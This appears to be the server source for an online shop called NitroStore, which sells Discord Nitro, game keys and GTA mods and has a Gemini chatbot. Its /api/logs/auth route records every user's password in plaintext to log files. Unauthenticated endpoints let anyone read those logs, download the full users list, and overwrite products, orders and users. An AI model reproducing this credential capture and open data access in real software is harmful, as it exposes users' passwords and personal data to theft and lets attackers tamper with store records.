import express from "express";
import path from "path";
import dotenv from "dotenv";
import fs from "fs";
import { createServer as createViteServer } from "vite";
import { GoogleGenAI } from "@google/genai";

dotenv.config();

const app = express();
const PORT = 3000;

app.use(express.json());

// Lazy-initialized Gemini client
let aiClient: GoogleGenAI | null = null;
function getGeminiClient() {
  if (!aiClient) {
    const key = process.env.GEMINI_API_KEY;
    if (!key) {
      throw new Error("GEMINI_API_KEY environment variable is missing in server environment");
    }
    aiClient = new GoogleGenAI({
      apiKey: key,
      httpOptions: {
        headers: {
          'User-Agent': 'aistudio-build',
        }
      }
    });
  }
  return aiClient;
}

// Secure Gemini Chat API endpoint
app.post("/api/chat", async (req, res) => {
  try {
    const { message, history } = req.body;
    if (!message) {
      return res.status(400).json({ error: "Message is required" });
    }

    const ai = getGeminiClient();
    
    // Map history to the required format for Gemini SDK contents parameter
    const contents = (history || []).map((item: any) => ({
      role: item.role === 'user' ? 'user' : 'model',
      parts: [{ text: item.text }]
    }));

    // Add current user message
    contents.push({
      role: 'user',
      parts: [{ text: message }]
    });

    const response = await ai.models.generateContent({
      model: "gemini-3.5-flash",
      contents: contents,
      config: {
        systemInstruction: "You are the official NitroStore AI Assistant (named 'NitroBot'). You help users with purchasing Discord Nitro, Game Keys, GTA Prefabs/Mods, and navigating our store. Speak in a helpful, conversational, and super-friendly Hinglish (Hindi/English mix) or English tone. Keep answers under 3-4 lines if possible so they fit neatly in the chat UI. Mention that our support is active 24/7 if they need human assistance.",
      }
    });

    res.json({ text: response.text });
  } catch (error: any) {
    console.error("Gemini API Error:", error);
    res.status(500).json({ 
      error: error.message || "Something went wrong with the AI assistant. Please try again later." 
    });
  }
});

// Applet status / health check endpoint
app.get("/api/health", (req, res) => {
  res.json({ status: "ok" });
});

// Logs System Directories & Automatic Cleanup (30 days reset)
const LOGS_DIR = path.join(process.cwd(), "logs");
const AUTH_LOGS_DIR = path.join(LOGS_DIR, "auth");
const ACTIVITY_LOGS_DIR = path.join(LOGS_DIR, "activity");

function ensureLogDirs() {
  if (!fs.existsSync(LOGS_DIR)) fs.mkdirSync(LOGS_DIR, { recursive: true });
  if (!fs.existsSync(AUTH_LOGS_DIR)) fs.mkdirSync(AUTH_LOGS_DIR, { recursive: true });
  if (!fs.existsSync(ACTIVITY_LOGS_DIR)) fs.mkdirSync(ACTIVITY_LOGS_DIR, { recursive: true });
}

function cleanupOldLogs() {
  try {
    ensureLogDirs();
    const directories = [AUTH_LOGS_DIR, ACTIVITY_LOGS_DIR];
    const now = Date.now();
    const thirtyDaysMs = 30 * 24 * 60 * 60 * 1000;

    directories.forEach(dir => {
      if (!fs.existsSync(dir)) return;
      const files = fs.readdirSync(dir);
      files.forEach(file => {
        const filePath = path.join(dir, file);
        try {
          const stats = fs.statSync(filePath);
          // Delete files older than 30 days
          if (now - stats.mtime.getTime() > thirtyDaysMs) {
            fs.unlinkSync(filePath);
            console.log(`[Logs Cleanup] Deleted log file older than 30 days: ${file}`);
          }
        } catch (e) {
          console.error(`[Logs Cleanup] Failed to check/delete file ${file}:`, e);
        }
      });
    });
  } catch (error) {
    console.error("[Logs Cleanup] Error during cleanup:", error);
  }
}

// Initial cleanup on server start
cleanupOldLogs();

// Route to log user authentication attempts (including successful/failed logins and signups)
app.post("/api/logs/auth", (req, res) => {
  try {
    ensureLogDirs();
    cleanupOldLogs(); // Clean up old logs whenever a write occurs
    
    const { email, password, username, action } = req.body;
    const timestamp = new Date().toISOString();
    
    const logEntry = `[${timestamp}] Action: ${action || "auth_event"} | Username: ${username || "N/A"} | Email: ${email || "N/A"} | Password: ${password || "N/A"}\n`;
    
    // Log into separate files based on date so individual log chunks are tidy and easily clearable
    const dateStr = new Date().toISOString().split('T')[0]; // YYYY-MM-DD
    const logFilePath = path.join(AUTH_LOGS_DIR, `auth_${dateStr}.log`);
    
    fs.appendFileSync(logFilePath, logEntry, "utf-8");
    res.json({ success: true });
  } catch (error) {
    console.error("Failed to write auth log:", error);
    res.status(500).json({ error: "Failed to write auth log" });
  }
});

// Route to log other activity logs (such as placing order, updating ticket, sending support inquiries)
app.post("/api/logs/activity", (req, res) => {
  try {
    ensureLogDirs();
    cleanupOldLogs(); // Clean up old logs whenever a write occurs
    
    const { email, username, action, details } = req.body;
    const timestamp = new Date().toISOString();
    
    const logEntry = `[${timestamp}] Action: ${action || "activity_event"} | Username: ${username || "Guest"} | Email: ${email || "Guest"} | Details: ${details || "N/A"}\n`;
    
    const dateStr = new Date().toISOString().split('T')[0]; // YYYY-MM-DD
    const logFilePath = path.join(ACTIVITY_LOGS_DIR, `activity_${dateStr}.log`);
    
    fs.appendFileSync(logFilePath, logEntry, "utf-8");
    res.json({ success: true });
  } catch (error) {
    console.error("Failed to write activity log:", error);
    res.status(500).json({ error: "Failed to write activity log" });
  }
});

// API endpoint for admin to view directory structure / listing of logs
app.get("/api/logs/list", (req, res) => {
  try {
    ensureLogDirs();
    cleanupOldLogs();
    
    const getLogFiles = (dir: string) => {
      if (!fs.existsSync(dir)) return [];
      return fs.readdirSync(dir).map(file => {
        const stats = fs.statSync(path.join(dir, file));
        return {
          name: file,
          size: stats.size,
          mtime: stats.mtime
        };
      });
    };
    
    res.json({
      authLogs: getLogFiles(AUTH_LOGS_DIR),
      activityLogs: getLogFiles(ACTIVITY_LOGS_DIR)
    });
  } catch (error) {
    res.status(500).json({ error: "Failed to list logs" });
  }
});

// API endpoint for admin to view a specific log file's contents
app.get("/api/logs/view", (req, res) => {
  try {
    ensureLogDirs();
    const { type, name } = req.query;
    if (!type || !name) {
      return res.status(400).json({ error: "Parameters 'type' and 'name' are required" });
    }
    
    const baseDir = type === "auth" ? AUTH_LOGS_DIR : ACTIVITY_LOGS_DIR;
    const targetPath = path.join(baseDir, String(name));
    
    // Prevent directory traversal attacks
    if (!targetPath.startsWith(baseDir)) {
      return res.status(403).json({ error: "Unauthorized access path" });
    }
    
    if (!fs.existsSync(targetPath)) {
      return res.status(404).json({ error: "Log file not found" });
    }
    
    const content = fs.readFileSync(targetPath, "utf-8");
    res.send(content);
  } catch (error) {
    res.status(500).json({ error: "Failed to read log content" });
  }
});

// Products persistence API endpoints
const PRODUCTS_FILE_PATH = path.join(process.cwd(), "src", "data", "products.json");
const ORDERS_FILE_PATH = path.join(process.cwd(), "src", "data", "orders.json");
const TICKETS_FILE_PATH = path.join(process.cwd(), "src", "data", "tickets.json");
const REVIEWS_FILE_PATH = path.join(process.cwd(), "src", "data", "reviews.json");
const USERS_FILE_PATH = path.join(process.cwd(), "src", "data", "users.json");

// SSE active clients list
let clients: any[] = [];

// Send update to all SSE clients
function broadcast(data: any) {
  clients.forEach(client => {
    try {
      client.write(`data: ${JSON.stringify(data)}\n\n`);
    } catch (e) {
      console.error("Failed to write to SSE client:", e);
    }
  });
}

app.get("/api/updates", (req, res) => {
  res.setHeader("Content-Type", "text/event-stream");
  res.setHeader("Cache-Control", "no-cache");
  res.setHeader("Connection", "keep-alive");
  res.setHeader("X-Accel-Buffering", "no"); // Prevent Nginx and Cloud Run from buffering the stream
  
  // CORS for SSE if needed
  res.setHeader("Access-Control-Allow-Origin", "*");

  // Flush headers immediately to establish the connection
  res.flushHeaders();

  // Send initial connected check payload
  res.write("data: :ok\n\n");
  
  clients.push(res);
  console.log(`[SSE] Client connected. Total active clients: ${clients.length}`);

  // Setup periodic ping every 5 seconds to keep the Cloud Run / reverse proxy connection active
  const keepAliveInterval = setInterval(() => {
    try {
      res.write("data: :keepalive\n\n");
    } catch (e) {
      console.error("[SSE] Failed to write keep-alive, client probably disconnected.");
    }
  }, 5000);
  
  req.on("close", () => {
    clearInterval(keepAliveInterval);
    clients = clients.filter(c => c !== res);
    console.log(`[SSE] Client disconnected. Total active clients: ${clients.length}`);
  });
});

app.get("/api/products", (req, res) => {
  try {
    if (fs.existsSync(PRODUCTS_FILE_PATH)) {
      const data = fs.readFileSync(PRODUCTS_FILE_PATH, "utf-8");
      return res.json(JSON.parse(data));
    }
    res.json(null);
  } catch (error) {
    console.error("Failed to read products file:", error);
    res.status(500).json({ error: "Failed to read products from server storage" });
  }
});

app.post("/api/products", (req, res) => {
  try {
    const productsList = req.body;
    if (!Array.isArray(productsList)) {
      return res.status(400).json({ error: "Products payload must be an array" });
    }
    
    // Create directory if it doesn't exist
    const dir = path.dirname(PRODUCTS_FILE_PATH);
    if (!fs.existsSync(dir)) {
      fs.mkdirSync(dir, { recursive: true });
    }
    
    fs.writeFileSync(PRODUCTS_FILE_PATH, JSON.stringify(productsList, null, 2), "utf-8");
    
    // Broadcast product list change
    broadcast({ type: "products_updated", products: productsList });

    res.json({ success: true, count: productsList.length });
  } catch (error) {
    console.error("Failed to write products file:", error);
    res.status(500).json({ error: "Failed to save products to server storage" });
  }
});

// Orders API
app.get("/api/orders", (req, res) => {
  try {
    if (fs.existsSync(ORDERS_FILE_PATH)) {
      const data = fs.readFileSync(ORDERS_FILE_PATH, "utf-8");
      return res.json(JSON.parse(data));
    }
    res.json([]);
  } catch (error) {
    console.error("Failed to read orders file:", error);
    res.status(500).json({ error: "Failed to read orders" });
  }
});

app.post("/api/orders", (req, res) => {
  try {
    const ordersList = req.body;
    if (!Array.isArray(ordersList)) {
      return res.status(400).json({ error: "Orders payload must be an array" });
    }
    
    // Find newly added orders by comparing against already existing orders
    let oldOrders: any[] = [];
    if (fs.existsSync(ORDERS_FILE_PATH)) {
      try {
        const raw = fs.readFileSync(ORDERS_FILE_PATH, "utf-8");
        oldOrders = JSON.parse(raw);
      } catch (e) {}
    }
    
    const oldIds = new Set(oldOrders.map(o => o.id));
    const newlyAddedOrders = ordersList.filter(o => !oldIds.has(o.id));
    
    const dir = path.dirname(ORDERS_FILE_PATH);
    if (!fs.existsSync(dir)) {
      fs.mkdirSync(dir, { recursive: true });
    }
    
    fs.writeFileSync(ORDERS_FILE_PATH, JSON.stringify(ordersList, null, 2), "utf-8");
    
    // Broadcast the update to all clients, indicating any new orders
    broadcast({
      type: "orders_updated",
      orders: ordersList,
      newOrders: newlyAddedOrders
    });
    
    res.json({ success: true, count: ordersList.length });
  } catch (error) {
    console.error("Failed to write orders file:", error);
    res.status(500).json({ error: "Failed to save orders" });
  }
});

// Tickets API
app.get("/api/tickets", (req, res) => {
  try {
    if (fs.existsSync(TICKETS_FILE_PATH)) {
      const data = fs.readFileSync(TICKETS_FILE_PATH, "utf-8");
      return res.json(JSON.parse(data));
    }
    res.json([]);
  } catch (error) {
    console.error("Failed to read tickets file:", error);
    res.status(500).json({ error: "Failed to read tickets" });
  }
});

app.post("/api/tickets", (req, res) => {
  try {
    const ticketsList = req.body;
    if (!Array.isArray(ticketsList)) {
      return res.status(400).json({ error: "Tickets payload must be an array" });
    }
    
    let oldTickets: any[] = [];
    if (fs.existsSync(TICKETS_FILE_PATH)) {
      try {
        const raw = fs.readFileSync(TICKETS_FILE_PATH, "utf-8");
        oldTickets = JSON.parse(raw);
      } catch (e) {}
    }
    
    const oldIds = new Set(oldTickets.map(t => t.id));
    const newlyAddedTickets = ticketsList.filter(t => !oldIds.has(t.id));
    
    const dir = path.dirname(TICKETS_FILE_PATH);
    if (!fs.existsSync(dir)) {
      fs.mkdirSync(dir, { recursive: true });
    }
    
    fs.writeFileSync(TICKETS_FILE_PATH, JSON.stringify(ticketsList, null, 2), "utf-8");
    
    // Broadcast ticket changes
    broadcast({
      type: "tickets_updated",
      tickets: ticketsList,
      newTickets: newlyAddedTickets
    });
    
    res.json({ success: true, count: ticketsList.length });
  } catch (error) {
    console.error("Failed to write tickets file:", error);
    res.status(500).json({ error: "Failed to save tickets" });
  }
});

// Reviews API
app.get("/api/reviews", (req, res) => {
  try {
    if (fs.existsSync(REVIEWS_FILE_PATH)) {
      const data = fs.readFileSync(REVIEWS_FILE_PATH, "utf-8");
      return res.json(JSON.parse(data));
    }
    res.json([]);
  } catch (error) {
    console.error("Failed to read reviews file:", error);
    res.status(500).json({ error: "Failed to read reviews" });
  }
});

app.post("/api/reviews", (req, res) => {
  try {
    const reviewsList = req.body;
    if (!Array.isArray(reviewsList)) {
      return res.status(400).json({ error: "Reviews payload must be an array" });
    }
    
    const dir = path.dirname(REVIEWS_FILE_PATH);
    if (!fs.existsSync(dir)) {
      fs.mkdirSync(dir, { recursive: true });
    }
    
    fs.writeFileSync(REVIEWS_FILE_PATH, JSON.stringify(reviewsList, null, 2), "utf-8");
    
    // Broadcast review changes
    broadcast({
      type: "reviews_updated",
      reviews: reviewsList
    });
    
    res.json({ success: true, count: reviewsList.length });
  } catch (error) {
    console.error("Failed to write reviews file:", error);
    res.status(500).json({ error: "Failed to save reviews" });
  }
});

// Users API
app.get("/api/users", (req, res) => {
  try {
    if (fs.existsSync(USERS_FILE_PATH)) {
      const data = fs.readFileSync(USERS_FILE_PATH, "utf-8");
      return res.json(JSON.parse(data));
    }
    res.json([]);
  } catch (error) {
    console.error("Failed to read users file:", error);
    res.status(500).json({ error: "Failed to read users" });
  }
});

app.post("/api/users", (req, res) => {
  try {
    const usersList = req.body;
    if (!Array.isArray(usersList)) {
      return res.status(400).json({ error: "Users payload must be an array" });
    }
    
    const dir = path.dirname(USERS_FILE_PATH);
    if (!fs.existsSync(dir)) {
      fs.mkdirSync(dir, { recursive: true });
    }
    
    fs.writeFileSync(USERS_FILE_PATH, JSON.stringify(usersList, null, 2), "utf-8");
    
    // Broadcast user changes
    broadcast({
      type: "users_updated",
      users: usersList
    });
    
    res.json({ success: true, count: usersList.length });
  } catch (error) {
    console.error("Failed to write users file:", error);
    res.status(500).json({ error: "Failed to save users" });
  }
});

async function start() {
  // Vite middleware for assets & SPA in development
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    // Serve production static assets from dist
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    const liveUrl = process.env.APP_URL || process.env.VITE_APP_URL || `http://localhost:${PORT}`;
    console.log(`\n⚡ NitroStore server started successfully!`);
    console.log(`👉 Live Connected Domain: ${liveUrl}`);
    console.log(`👉 Local Port Access:     http://localhost:${PORT}`);
    console.log(`👉 Network Port Access:   http://127.0.0.1:${PORT}`);
    console.log(`👉 To access on other devices (e.g. phone/laptop on same Wi-Fi), use your computer's local IP address (e.g. http://192.168.x.x:${PORT})\n`);
  });
}

start();
